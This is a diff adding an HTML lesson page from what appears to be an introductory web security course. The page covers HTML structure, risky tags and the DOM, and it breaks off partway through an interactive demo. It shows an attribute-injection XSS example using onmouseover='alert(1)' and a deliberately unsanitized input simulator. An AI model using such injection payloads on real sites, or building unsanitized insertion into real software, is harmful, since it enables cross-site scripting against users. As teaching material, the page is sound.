@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>1.2 — HTML Structure · Web Security</title>
+  <style>
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:          #0d1117;
+      --bg-card:     #161b22;
+      --bg-hover:    #1c2333;
+      --border:      #30363d;
+      --border-soft: #21262d;
+      --text:        #c9d1d9;
+      --text-muted:  #8b949e;
+      --text-bright: #e6edf3;
+      --blue:        #58a6ff;
+      --green:       #3fb950;
+      --green-dark:  #238636;
+      --red:         #f78166;
+      --yellow:      #e3b341;
+      --purple:      #bc8cff;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.75;
+      font-size: 16px;
+    }
+
+    a { color: var(--blue); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* ── NAV ── */
+    nav {
+      background: var(--bg-card);
+      border-bottom: 1px solid var(--border);
+      padding: 0 2rem;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .nav-left { display: flex; align-items: center; gap: 0.5rem; font-size: 0.875rem; color: var(--text-muted); }
+    .nav-left a { color: var(--text-muted); }
+    .nav-left a:hover { color: var(--blue); text-decoration: none; }
+    .nav-sep { color: var(--border); }
+    .nav-current { color: var(--text-bright); font-weight: 600; }
+    .nav-right { display: flex; gap: 0.5rem; }
+    .nav-btn {
+      background: var(--bg-hover); border: 1px solid var(--border);
+      color: var(--text-muted); padding: 0.3rem 0.9rem; border-radius: 6px;
+      font-size: 0.8rem; cursor: pointer; text-decoration: none;
+      transition: background 0.15s, color 0.15s;
+    }
+    .nav-btn:hover { background: var(--border); color: var(--text-bright); text-decoration: none; }
+    .nav-btn.prev { }
+    .nav-btn.next { background: var(--green-dark); color: #fff; border-color: var(--green-dark); }
+    .nav-btn.next:hover { background: var(--green); }
+
+    /* ── PAGE HEADER ── */
+    .page-header {
+      background: linear-gradient(160deg, #0d1f35 0%, #0d1117 70%);
+      border-bottom: 1px solid var(--border);
+      padding: 2.5rem 2rem 2rem;
+      max-width: 860px;
+      margin: 0 auto;
+    }
+    .module-tag {
+      display: inline-block; background: #1f2d3d;
+      border: 1px solid #1f6feb55; color: var(--blue);
+      font-size: 0.72rem; font-weight: 600; letter-spacing: 0.08em;
+      text-transform: uppercase; padding: 0.25rem 0.75rem;
+      border-radius: 20px; margin-bottom: 0.75rem;
+    }
+    .page-header h1 { font-size: 1.9rem; font-weight: 800; color: var(--text-bright); margin-bottom: 0.5rem; }
+    .page-header p { color: var(--text-muted); font-size: 1rem; max-width: 600px; }
+    .header-meta { display: flex; gap: 1rem; margin-top: 1rem; flex-wrap: wrap; }
+    .header-meta span {
+      font-size: 0.8rem; color: var(--text-muted); background: var(--bg-card);
+      border: 1px solid var(--border-soft); padding: 0.2rem 0.75rem; border-radius: 20px;
+    }
+
+    /* ── CONTENT ── */
+    .content { max-width: 860px; margin: 0 auto; padding: 2rem 2rem 4rem; }
+
+    /* ── OBJECTIVES ── */
+    .objectives {
+      background: var(--bg-card); border: 1px solid var(--border);
+      border-left: 4px solid var(--blue); border-radius: 8px;
+      padding: 1.25rem 1.5rem; margin-bottom: 2.5rem;
+    }
+    .objectives h3 {
+      font-size: 0.85rem; text-transform: uppercase;
+      letter-spacing: 0.08em; color: var(--blue); margin-bottom: 0.75rem;
+    }
+    .objectives ul { list-style: none; padding: 0; }
+    .objectives ul li {
+      padding: 0.3rem 0 0.3rem 1.75rem; position: relative;
+      font-size: 0.925rem; color: var(--text);
+    }
+    .objectives ul li::before { content: "✓"; position: absolute; left: 0; color: var(--green); font-weight: 700; }
+
+    /* ── HEADINGS ── */
+    .section-heading {
+      font-size: 1.2rem; font-weight: 700; color: var(--text-bright);
+      margin: 2.5rem 0 1rem; padding-bottom: 0.4rem;
+      border-bottom: 1px solid var(--border-soft);
+      display: flex; align-items: center; gap: 0.5rem;
+    }
+    p { margin-bottom: 1rem; }
+    strong { color: var(--text-bright); }
+    code {
+      background: var(--border-soft); color: var(--yellow);
+      padding: 0.15rem 0.45rem; border-radius: 4px;
+      font-family: 'Courier New', monospace; font-size: 0.875rem;
+    }
+    ul.content-list { padding-left: 1.5rem; margin-bottom: 1rem; }
+    ul.content-list li { margin-bottom: 0.4rem; }
+
+    /* ── CALLOUTS ── */
+    .callout {
+      border-radius: 8px; padding: 1rem 1.25rem;
+      margin: 1.5rem 0; border-left: 4px solid; font-size: 0.925rem; line-height: 1.6;
+    }
+    .callout-title { font-weight: 700; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 0.4rem; }
+    .callout.security { background: #1a0e0e; border-color: var(--red); }
+    .callout.security .callout-title { color: var(--red); }
+    .callout.tip { background: #0e1a12; border-color: var(--green); }
+    .callout.tip .callout-title { color: var(--green); }
+    .callout.info { background: #0d1b2e; border-color: var(--blue); }
+    .callout.info .callout-title { color: var(--blue); }
+    .callout.warning { background: #1a1500; border-color: var(--yellow); }
+    .callout.warning .callout-title { color: var(--yellow); }
+
+    /* ── TABLE ── */
+    table { width: 100%; border-collapse: collapse; margin: 1.25rem 0; font-size: 0.9rem; }
+    thead tr { background: var(--border-soft); }
+    th { padding: 0.65rem 1rem; color: var(--blue); text-align: left; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.06em; border: 1px solid var(--border); }
+    td { padding: 0.65rem 1rem; border: 1px solid var(--border); color: var(--text); }
+    tbody tr:nth-child(even) { background: #0a0e13; }
+    tbody tr:hover { background: var(--bg-hover); }
+
+    /* ── DOM TREE VISUAL ── */
+    .dom-tree {
+      background: var(--bg-card); border: 1px solid var(--border);
+      border-radius: 10px; padding: 1.5rem 2rem; margin: 1.5rem 0;
+      font-family: 'Courier New', monospace; font-size: 0.875rem;
+    }
+    .tree-node {
+      display: flex; align-items: flex-start;
+      gap: 0.5rem; padding: 0.3rem 0; cursor: pointer;
+      transition: background 0.15s; border-radius: 4px;
+      padding-left: 0.4rem;
+    }
+    .tree-node:hover { background: var(--bg-hover); }
+    .tree-indent-1 { margin-left: 1.5rem; }
+    .tree-indent-2 { margin-left: 3rem; }
+    .tree-indent-3 { margin-left: 4.5rem; }
+    .tree-tag { color: var(--blue); font-weight: 700; }
+    .tree-attr { color: var(--yellow); }
+    .tree-text { color: var(--green); font-style: italic; }
+    .tree-connector { color: var(--text-muted); user-select: none; }
+    .node-tooltip {
+      margin-top: 0.75rem; padding: 0.75rem 1rem;
+      background: var(--bg); border: 1px solid var(--border);
+      border-radius: 6px; font-family: 'Segoe UI', sans-serif;
+      font-size: 0.875rem; display: none;
+    }
+    .node-tooltip.show { display: block; }
+    .node-tooltip .nt-title { font-weight: 700; color: var(--text-bright); margin-bottom: 0.25rem; }
+    .node-tooltip p { margin: 0; color: var(--text-muted); }
+
+    /* ── LIVE CODE EDITOR ── */
+    .editor-wrap {
+      background: var(--bg-card); border: 1px solid var(--border);
+      border-radius: 10px; overflow: hidden; margin: 1.5rem 0;
+    }
+    .editor-toolbar {
+      background: var(--border-soft); padding: 0.6rem 1rem;
+      display: flex; align-items: center; justify-content: space-between;
+      flex-wrap: wrap; gap: 0.5rem;
+    }
+    .editor-toolbar-left { display: flex; align-items: center; gap: 0.75rem; }
+    .editor-dots { display: flex; gap: 5px; }
+    .editor-dots span {
+      width: 12px; height: 12px; border-radius: 50%; display: block;
+    }
+    .ed-red    { background: #f78166; }
+    .ed-yellow { background: #e3b341; }
+    .ed-green  { background: #3fb950; }
+    .editor-title { font-size: 0.8rem; color: var(--text-muted); font-family: 'Courier New', monospace; }
+    .editor-btns { display: flex; gap: 0.5rem; }
+    .ed-btn {
+      font-size: 0.8rem; font-weight: 600; padding: 0.3rem 0.9rem;
+      border-radius: 6px; cursor: pointer; border: 1px solid var(--border);
+      transition: background 0.15s;
+    }
+    .ed-btn-run { background: var(--green-dark); color: #fff; border-color: var(--green-dark); }
+    .ed-btn-run:hover { background: var(--green); }
+    .ed-btn-reset { background: var(--bg-hover); color: var(--text-muted); }
+    .ed-btn-reset:hover { background: var(--border); color: var(--text-bright); }
+    .editor-panes { display: grid; grid-template-columns: 1fr 1fr; }
+    .editor-code {
+      width: 100%; background: #0d1117; color: var(--text);
+      border: none; outline: none; padding: 1rem 1.25rem;
+      font-family: 'Courier New', monospace; font-size: 0.875rem;
+      line-height: 1.6; resize: none; border-right: 1px solid var(--border);
+      min-height: 180px; tab-size: 2;
+    }
+    .editor-preview {
+      background: #fff; border: none; width: 100%; min-height: 180px;
+    }
+    .editor-label {
+      background: var(--border-soft); padding: 0.3rem 1rem;
+      font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase;
+      letter-spacing: 0.06em; display: flex; justify-content: space-between;
+    }
+    @media (max-width: 640px) {
+      .editor-panes { grid-template-columns: 1fr; }
+      .editor-code { border-right: none; border-bottom: 1px solid var(--border); }
+    }
+
+    /* ── SECURITY TAG HIGHLIGHTER ── */
+    .tag-explorer {
+      background: var(--bg-card); border: 1px solid var(--border);
+      border-radius: 10px; overflow: hidden; margin: 1.5rem 0;
+    }
+    .tag-explorer-top {
+      padding: 1rem 1.25rem; border-bottom: 1px solid var(--border);
+      font-size: 0.875rem; color: var(--text-muted);
+    }
+    .tag-grid {
+      display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+      gap: 0.5rem; padding: 1rem 1.25rem;
+    }
+    .tag-chip {
+      background: var(--bg); border: 1px solid var(--border);
+      border-radius: 6px; padding: 0.5rem 0.75rem; cursor: pointer;
+      font-family: 'Courier New', monospace; font-size: 0.875rem;
+      color: var(--yellow); text-align: center;
+      transition: background 0.15s, border-color 0.15s;
+    }
+    .tag-chip:hover { background: var(--bg-hover); border-color: var(--blue); color: var(--blue); }
+    .tag-chip.active { background: #1f2d3d; border-color: var(--blue); color: var(--blue); }
+    .tag-chip.danger { color: var(--red); border-color: #b91c1c44; background: #1a0e0e11; }
+    .tag-chip.danger:hover, .tag-chip.danger.active { background: #1a0e0e; border-color: var(--red); color: var(--red); }
+    .tag-detail {
+      border-top: 1px solid var(--border); padding: 1.25rem 1.5rem;
+      display: none; font-size: 0.9rem;
+    }
+    .tag-detail.show { display: block; }
+    .tag-detail h4 { color: var(--text-bright); margin-bottom: 0.5rem; font-size: 1rem; }
+    .tag-detail p { color: var(--text-muted); margin-bottom: 0.75rem; }
+    .tag-detail pre {
+      background: var(--bg); border: 1px solid var(--border);
+      border-radius: 6px; padding: 0.75rem 1rem;
+      font-size: 0.8rem; color: var(--text); overflow-x: auto; margin: 0;
+    }
+    .risk-badge {
+      display: inline-block; font-size: 0.72rem; font-weight: 700;
+      padding: 0.2rem 0.6rem; border-radius: 20px; margin-left: 0.5rem;
+      text-transform: uppercase; letter-spacing: 0.05em;
+    }
+    .risk-high   { background: #b91c1c33; color: var(--red); border: 1px solid #b91c1c55; }
+    .risk-medium { background: #b0880033; color: var(--yellow); border: 1px solid #b0880055; }
+    .risk-low    { background: #1a7f3733; color: var(--green); border: 1px solid #1a7f3755; }
+
+    /* ── QUIZ ── */
+    .quiz-section {
+      background: var(--bg-card); border: 1px solid var(--border);
+      border-radius: 10px; overflow: hidden; margin: 2.5rem 0;
+    }
+    .quiz-header {
+      background: var(--border-soft); padding: 1rem 1.5rem;
+      display: flex; align-items: center; gap: 0.75rem;
+    }
+    .quiz-header h3 { font-size: 1rem; color: var(--text-bright); }
+    .quiz-header p  { font-size: 0.8rem; color: var(--text-muted); margin: 0; }
+    .quiz-body { padding: 1.5rem; }
+    .quiz-question {
+      margin-bottom: 2rem; padding-bottom: 2rem;
+      border-bottom: 1px solid var(--border-soft);
+    }
+    .quiz-question:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+    .quiz-q { font-size: 0.95rem; font-weight: 600; color: var(--text-bright); margin-bottom: 1rem; }
+    .quiz-q .q-num {
+      display: inline-block; background: #1f6feb; color: #fff;
+      font-size: 0.75rem; font-weight: 700; width: 22px; height: 22px;
+      border-radius: 50%; text-align: center; line-height: 22px; margin-right: 0.5rem;
+    }
+    .quiz-options { display: flex; flex-direction: column; gap: 0.5rem; }
+    .quiz-option {
+      display: flex; align-items: flex-start; gap: 0.75rem;
+      padding: 0.75rem 1rem; border: 1px solid var(--border);
+      border-radius: 8px; cursor: pointer;
+      transition: background 0.15s, border-color 0.15s;
+      background: var(--bg); font-size: 0.9rem;
+    }
+    .quiz-option:hover { background: var(--bg-hover); border-color: var(--blue); }
+    .quiz-option input[type="radio"] { margin-top: 2px; accent-color: var(--blue); flex-shrink: 0; }
+    .quiz-option.correct { background: #0e1a12; border-color: var(--green); color: var(--text-bright); }
+    .quiz-option.wrong   { background: #1a0e0e; border-color: var(--red); color: var(--red); }
+    .quiz-option.disabled { pointer-events: none; opacity: 0.6; }
+    .quiz-option.correct.disabled { opacity: 1; }
+    .quiz-feedback {
+      margin-top: 0.75rem; padding: 0.75rem 1rem; border-radius: 6px;
+      font-size: 0.875rem; display: none;
+    }
+    .quiz-feedback.show { display: block; }
+    .quiz-feedback.correct { background: #0e1a12; color: var(--green); border: 1px solid var(--green-dark); }
+    .quiz-feedback.wrong   { background: #1a0e0e; color: var(--red);   border: 1px solid #b91c1c; }
+    .quiz-submit {
+      background: #1f6feb; color: #fff; border: none;
+      padding: 0.65rem 1.75rem; border-radius: 8px; font-size: 0.9rem;
+      font-weight: 600; cursor: pointer; margin-top: 1rem; transition: background 0.15s;
+    }
+    .quiz-submit:hover { background: #388bfd; }
+    .quiz-submit:disabled { background: var(--border); cursor: not-allowed; }
+    .quiz-score {
+      text-align: center; padding: 1.5rem; display: none;
+      border-top: 1px solid var(--border-soft);
+    }
+    .quiz-score.show { display: block; }
+    .score-number { font-size: 2.5rem; font-weight: 800; color: var(--green); }
+    .score-label  { font-size: 0.9rem; color: var(--text-muted); margin-top: 0.25rem; }
+
+    /* ── BOTTOM NAV ── */
+    .bottom-nav {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border-soft);
+      gap: 1rem; flex-wrap: wrap;
+    }
+    .bottom-nav a {
+      display: inline-flex; align-items: center; gap: 0.5rem;
+      padding: 0.65rem 1.5rem; border-radius: 8px; font-size: 0.9rem;
+      font-weight: 600; text-decoration: none; transition: background 0.15s;
+    }
+    .btn-back { background: var(--bg-card); border: 1px solid var(--border); color: var(--text-muted); }
+    .btn-back:hover { background: var(--bg-hover); color: var(--text-bright); }
+    .btn-next { background: var(--green-dark); border: 1px solid var(--green-dark); color: #fff; }
+    .btn-next:hover { background: var(--green); }
+    .complete-badge {
+      display: none; align-items: center; gap: 0.5rem;
+      background: #0e1a12; border: 1px solid var(--green-dark);
+      color: var(--green); padding: 0.5rem 1rem; border-radius: 8px;
+      font-size: 0.85rem; font-weight: 600;
+    }
+    .complete-badge.show { display: flex; }
+
+  </style>
+</head>
+<body>
+
+  <!-- ══ NAV ══ -->
+  <nav>
+    <div class="nav-left">
+      <a href="../index.html">🛡️ Web Security</a>
+      <span class="nav-sep">›</span>
+      <a href="#">Module 1</a>
+      <span class="nav-sep">›</span>
+      <span class="nav-current">1.2 — HTML Structure</span>
+    </div>
+    <div class="nav-right">
+      <a class="nav-btn prev" href="1-1.html">← 1.1 From URL to Webpage</a>
+      <a class="nav-btn next" href="1-3.html">Next: Forms & Input →</a>
+    </div>
+  </nav>
+
+
+  <!-- ══ PAGE HEADER ══ -->
+  <div class="page-header">
+    <div class="module-tag">Module 1 · Sub-module 1.2</div>
+    <h1>🏗️ HTML Structure</h1>
+    <p>HTML is the skeleton of every webpage. Understanding how it is built — and which tags are dangerous — is the foundation of all web security work.</p>
+    <div class="header-meta">
+      <span>⏱️ ~25 minutes</span>
+      <span>📖 Reading + Interactive</span>
+      <span>⚡ Live code editor</span>
+      <span>🧠 4-question quiz</span>
+    </div>
+  </div>
+
+
+  <!-- ══ CONTENT ══ -->
+  <div class="content">
+
+    <div class="objectives">
+      <h3>🎯 What you will learn</h3>
+      <ul>
+        <li>What HTML is and how a browser reads it</li>
+        <li>The structure of every HTML document — the skeleton</li>
+        <li>What tags, attributes, and elements are</li>
+        <li>Which HTML tags are most relevant to web security and why</li>
+        <li>How to read and write basic HTML in a live editor</li>
+      </ul>
+    </div>
+
+
+    <!-- ══ SECTION 1 — What is HTML ══ -->
+    <div class="section-heading">📄 What is HTML?</div>
+
+    <p>
+      <strong>HTML (HyperText Markup Language)</strong> is the language used to describe the
+      structure and content of a webpage. It is not a programming language — it does not perform
+      calculations or make decisions. It is a <strong>markup language</strong>, which means it uses
+      special tags to label and organise content.
+    </p>
+
+    <p>
+      When your browser receives an HTTP response from a server, that response body is almost
+      always an HTML document. The browser reads it top to bottom, interprets the tags,
+      and renders the result visually on your screen.
+    </p>
+
+    <div class="callout info">
+      <div class="callout-title">ℹ️ Why HTML matters for cybersecurity</div>
+      Every XSS attack works by injecting malicious HTML or JavaScript into a page.
+      To find these injection points, to read source code during a pentest, and to understand
+      why a payload works — you must be able to read and write HTML fluently.
+      You are not learning this to build websites. You are learning it to break them.
+    </div>
+
+
+    <!-- ══ SECTION 2 — The Skeleton ══ -->
+    <div class="section-heading">🦴 The HTML Skeleton</div>
+
+    <p>
+      Every HTML document — no matter how complex — is built on the same basic skeleton.
+      Here it is, with every part explained:
+    </p>
+
+    <!-- Live editor 1 — the skeleton -->
+    <div class="editor-wrap">
+      <div class="editor-toolbar">
+        <div class="editor-toolbar-left">
+          <div class="editor-dots">
+            <span class="ed-red"></span>
+            <span class="ed-yellow"></span>
+            <span class="ed-green"></span>
+          </div>
+          <span class="editor-title">html-skeleton.html</span>
+        </div>
+        <div class="editor-btns">
+          <button class="ed-btn ed-btn-reset" onclick="resetEditor('ed1')">Reset</button>
+          <button class="ed-btn ed-btn-run"   onclick="runEditor('ed1')">▶ Run</button>
+        </div>
+      </div>
+      <div class="editor-label">
+        <span>✏️ Edit the code — then click Run to see the result</span>
+        <span>Preview →</span>
+      </div>
+      <div class="editor-panes">
+        <textarea class="editor-code" id="ed1" spellcheck="false"><!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>My First Page</title>
+  </head>
+  <body>
+    <h1>Hello, Security Student!</h1>
+    <p>Try changing this text and clicking Run.</p>
+  </body>
+</html></textarea>
+        <iframe class="editor-preview" id="ed1-preview"></iframe>
+      </div>
+    </div>
+
+    <p>Let's break down what each part means:</p>
+
+    <table>
+      <thead><tr><th>Part</th><th>What it does</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td><code>&lt;!DOCTYPE html&gt;</code></td><td>Tells the browser this is an HTML5 document</td><td>Always the very first line</td></tr>
+        <tr><td><code>&lt;html&gt;</code></td><td>The root element — everything lives inside this</td><td><code>lang="en"</code> sets the language</td></tr>
+        <tr><td><code>&lt;head&gt;</code></td><td>Metadata — not visible on the page</td><td>Contains title, charset, CSS links, scripts</td></tr>
+        <tr><td><code>&lt;meta charset="UTF-8"&gt;</code></td><td>Sets the character encoding</td><td>Prevents some encoding-based XSS bypasses</td></tr>
+        <tr><td><code>&lt;title&gt;</code></td><td>The text shown in the browser tab</td><td>Visible in page source — check in pentests</td></tr>
+        <tr><td><code>&lt;body&gt;</code></td><td>Everything the user sees and interacts with</td><td>Where XSS payloads are injected and rendered</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout tip">
+      <div class="callout-title">💡 Try it</div>
+      In the editor above, change <code>Hello, Security Student!</code> to something else and click <strong>Run</strong>.
+      Then add a second paragraph: <code>&lt;p&gt;This is paragraph two.&lt;/p&gt;</code> — and run it again.
+    </div>
+
+
+    <!-- ══ SECTION 3 — Tags, Elements, Attributes ══ -->
+    <div class="section-heading">🏷️ Tags, Elements, and Attributes</div>
+
+    <p>
+      HTML is made of <strong>elements</strong>. Each element is defined by a pair of <strong>tags</strong>:
+      an opening tag and a closing tag. Between them is the content.
+    </p>
+
+    <!-- Live editor 2 — tags -->
+    <div class="editor-wrap">
+      <div class="editor-toolbar">
+        <div class="editor-toolbar-left">
+          <div class="editor-dots">
+            <span class="ed-red"></span><span class="ed-yellow"></span><span class="ed-green"></span>
+          </div>
+          <span class="editor-title">tags-and-attributes.html</span>
+        </div>
+        <div class="editor-btns">
+          <button class="ed-btn ed-btn-reset" onclick="resetEditor('ed2')">Reset</button>
+          <button class="ed-btn ed-btn-run"   onclick="runEditor('ed2')">▶ Run</button>
+        </div>
+      </div>
+      <div class="editor-label">
+        <span>✏️ Experiment with the tags below</span>
+        <span>Preview →</span>
+      </div>
+      <div class="editor-panes">
+        <textarea class="editor-code" id="ed2" spellcheck="false"><!-- A heading element -->
+<h1>This is a heading</h1>
+
+<!-- A paragraph element -->
+<p>This is a paragraph of text.</p>
+
+<!-- An element WITH attributes -->
+<a href="https://www.google.com" target="_blank">
+  Click this link
+</a>
+
+<!-- An image element (self-closing) -->
+<img src="https://placecats.com/100/60" alt="A cat">
+
+<!-- Try adding your own element below! --></textarea>
+        <iframe class="editor-preview" id="ed2-preview"></iframe>
+      </div>
+    </div>
+
+    <p><strong>Three concepts you must understand:</strong></p>
+
+    <table>
+      <thead><tr><th>Concept</th><th>Example</th><th>Explanation</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>Tag</strong></td>
+          <td><code>&lt;p&gt;</code> and <code>&lt;/p&gt;</code></td>
+          <td>The opening and closing markers of an element. The slash <code>/</code> marks the closing tag.</td>
+        </tr>
+        <tr>
+          <td><strong>Element</strong></td>
+          <td><code>&lt;p&gt;Hello&lt;/p&gt;</code></td>
+          <td>The full unit — opening tag + content + closing tag together.</td>
+        </tr>
+        <tr>
+          <td><strong>Attribute</strong></td>
+          <td><code>href="https://..."</code></td>
+          <td>Extra information added inside the opening tag. Always written as <code>name="value"</code>.</td>
+        </tr>
+        <tr>
+          <td><strong>Self-closing</strong></td>
+          <td><code>&lt;img src="..."&gt;</code></td>
+          <td>Some elements have no content and no closing tag — like <code>&lt;img&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;br&gt;</code>.</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout security">
+      <div class="callout-title">🔐 Security Note — Attributes are injection points too</div>
+      XSS payloads are not only injected between tags. They are very commonly injected
+      <strong>inside attributes</strong>. For example, if a server puts your name into an HTML attribute
+      without sanitizing it:<br><br>
+      <code>&lt;input value="YOUR_NAME_HERE"&gt;</code><br><br>
+      An attacker can break out of the attribute with a quote and inject JavaScript:<br><br>
+      <code>&lt;input value="" onmouseover="alert(1)"&gt;</code><br><br>
+      This is called an <strong>attribute injection</strong> XSS, and you will practice it in Module 3.
+    </div>
+
+
+    <!-- ══ SECTION 4 — Security-Relevant Tags ══ -->
+    <div class="section-heading">⚠️ Security-Relevant HTML Tags</div>
+
+    <p>
+      Not all HTML tags are equal from a security perspective.
+      Some tags can directly execute code, load external resources, or
+      embed entire pages — making them the attacker's primary tools.
+      Click each tag below to learn what it does and why it matters.
+    </p>
+
+    <div class="tag-explorer">
+      <div class="tag-explorer-top">
+        🖱️ Click any tag to see its security details
+        &nbsp;·&nbsp;
+        <span style="color:var(--red)">Red = high risk</span>
+        &nbsp;·&nbsp;
+        <span style="color:var(--yellow)">Yellow = medium risk</span>
+      </div>
+      <div class="tag-grid">
+        <div class="tag-chip danger" onclick="showTag('script')">&lt;script&gt;</div>
+        <div class="tag-chip danger" onclick="showTag('iframe')">&lt;iframe&gt;</div>
+        <div class="tag-chip danger" onclick="showTag('img')">&lt;img&gt;</div>
+        <div class="tag-chip danger" onclick="showTag('svg')">&lt;svg&gt;</div>
+        <div class="tag-chip danger" onclick="showTag('a')">&lt;a&gt;</div>
+        <div class="tag-chip"        onclick="showTag('form')">&lt;form&gt;</div>
+        <div class="tag-chip"        onclick="showTag('input')">&lt;input&gt;</div>
+        <div class="tag-chip"        onclick="showTag('div')">&lt;div&gt;</div>
+        <div class="tag-chip"        onclick="showTag('span')">&lt;span&gt;</div>
+        <div class="tag-chip"        onclick="showTag('meta')">&lt;meta&gt;</div>
+      </div>
+      <div class="tag-detail" id="tagDetail"></div>
+    </div>
+
+
+    <!-- ══ SECTION 5 — The DOM Preview ══ -->
+    <div class="section-heading">🌳 HTML and the DOM Tree</div>
+
+    <p>
+      When the browser reads HTML, it does not just display it — it builds it into a
+      <strong>tree structure in memory</strong> called the <strong>DOM (Document Object Model)</strong>.
+      Think of it like a family tree: the <code>&lt;html&gt;</code> element is the grandparent,
+      <code>&lt;head&gt;</code> and <code>&lt;body&gt;</code> are its children,
+      and every tag inside body is a further descendant.
+    </p>
+
+    <p>
+      You will study the DOM in depth in Module 2. For now, hover over the nodes below
+      to understand how the HTML you write becomes a DOM tree.
+    </p>
+
+    <div class="dom-tree" id="domTree">
+      <div class="tree-node" onmouseenter="showNodeTip('document')" onmouseleave="hideNodeTip()">
+        <span class="tree-connector">📄</span>
+        <span class="tree-tag">document</span>
+      </div>
+      <div class="tree-node tree-indent-1" onmouseenter="showNodeTip('html')" onmouseleave="hideNodeTip()">
+        <span class="tree-connector">└─</span>
+        <span class="tree-tag">&lt;html&gt;</span>
+      </div>
+      <div class="tree-node tree-indent-2" onmouseenter="showNodeTip('head')" onmouseleave="hideNodeTip()">
+        <span class="tree-connector">├─</span>
+        <span class="tree-tag">&lt;head&gt;</span>
+      </div>
+      <div class="tree-node tree-indent-3" onmouseenter="showNodeTip('title')" onmouseleave="hideNodeTip()">
+        <span class="tree-connector">└─</span>
+        <span class="tree-tag">&lt;title&gt;</span>
+        <span class="tree-text">"My Page"</span>
+      </div>
+      <div class="tree-node tree-indent-2" onmouseenter="showNodeTip('body')" onmouseleave="hideNodeTip()">
+        <span class="tree-connector">└─</span>
+        <span class="tree-tag">&lt;body&gt;</span>
+      </div>
+      <div class="tree-node tree-indent-3" onmouseenter="showNodeTip('h1')" onmouseleave="hideNodeTip()">
+        <span class="tree-connector">├─</span>
+        <span class="tree-tag">&lt;h1&gt;</span>
+        <span class="tree-text">"Hello World"</span>
+      </div>
+      <div class="tree-node tree-indent-3" onmouseenter="showNodeTip('form')" onmouseleave="hideNodeTip()">
+        <span class="tree-connector">└─</span>
+        <span class="tree-tag">&lt;form&gt;</span>
+        <span class="tree-attr">action="/submit"</span>
+      </div>
+      <div class="tree-node" style="margin-left:6rem" onmouseenter="showNodeTip('input')" onmouseleave="hideNodeTip()">
+        <span class="tree-connector">└─</span>
+        <span class="tree-tag">&lt;input&gt;</span>
+        <span class="tree-attr">type="text" name="q"</span>
+        <span style="color:var(--red); font-size:0.8rem; margin-left:0.5rem;">← injection point</span>
+      </div>
+      <div class="node-tooltip" id="nodeTooltip"></div>
+    </div>
+
+    <div class="callout security">
+      <div class="callout-title">🔐 Security Note — The DOM is the target</div>
+      When JavaScript runs on a page, it interacts with the DOM — reading values,
+      writing content, and responding to user actions. An XSS attack injects malicious JavaScript
+      that manipulates the DOM: stealing values (like cookies), creating fake login forms,
+      or redirecting the user to a phishing page. The DOM is not just a concept — it is
+      the battlefield of every web-based attack.
+    </div>
+
+
+    <!-- ══ SECTION 6 — Try an XSS payload ══ -->
+    <div class="section-heading">💥 See HTML Injection in Action</div>
+
+    <p>
+      Before we study XSS in detail in Module 3, let's get a first taste.
+      The editor below simulates a webpage that takes user input and puts it
+      directly into the HTML without any sanitization — exactly like a vulnerable application.
+    </p>
+    <p>
+      Try typing normal text first — then try the payloads listed below the editor.
+    </p>
+
+    <div class="editor-wrap">
+      <div class="editor-toolbar">
+        <div class="editor-toolbar-left">
+          <div class="editor-dots">
+            <span class="ed-red"></span><span class="ed-yellow"></span><span class="ed-green"></span>
+          </div>
+          <span class="editor-title">vulnerable-page-simulation.html</span>
+        </div>
+        <div class="editor-btns">
+          <button class="ed-btn ed-btn-reset" onclick="resetInjection()">Reset</button>
+          <button class="ed-btn ed-btn-run"   onclick="runInjection()">▶ Inject</button>
+        </div>
+      </div>
+      <div style="padding: 1rem 1.25rem; border-bottom: 1px solid var(--border); background: var(--bg);">
+        <label style="font-size:0.8rem; color:var(--text-muted); display:block; margin-bottom:0.5rem;">
+          Enter a username (this is inserted directly into the HTML below):
+        </label>
+        <input type="text" id="injInput"
+          placeholder='Try: <b>bold</b>  or  <h1>injected</h1>'
+          style="width:100%; background:var(--bg-card); border:1px solid var(--border);
+                 color:var(--text); padding:0.6rem 0.9rem; border-radius:6px;
+                 font-family:'Courier New',monospace; font-size:0.9rem; outline:none;">
+      </div>
+      <div style="padding:1rem 1.25rem; background:var(--bg); border-bottom:1px solid var(--border);">
+        <div style="font-size:0.75rem; color:var(--text-muted); margin-bottom:0.4rem;">
+          Server-generated HTML (what the browser actually receives):
+        </div>
+        <pre id="injSource" style="background:var(--bg-card); border:1px solid var(--border);
+          border-radius:6px; padding:0.75rem 1rem; font-size:0.8rem; color:var(--text);
+          overflow-x:auto; margin:0;">&lt;p&gt;Welcome, <span style="color:var(--red)">[your input goes here]</span>&lt;/p&gt;</pre>
+      </div>
+      <div style="padding:1rem 1.25rem; background:#fff; min-height:60px;">
+        <div style="font-size:0.72rem; color:#666; margin-bottom:0.3rem; font-family:sans-serif;">
+          Browser renders:
+        </div>
+        <div id="injOutput" style="font-family:sans-serif; font-size:1rem; color:#111;">
+          Welcome, <em style="color:#999">[your input goes here]</em>
+        </div>
+      </div>
+    </div>
+
+    <div style="background:var(--bg-card); border:1px solid var(--border); border-radius:8px; padding:1rem 1.25rem; margin-top:0.5rem;">
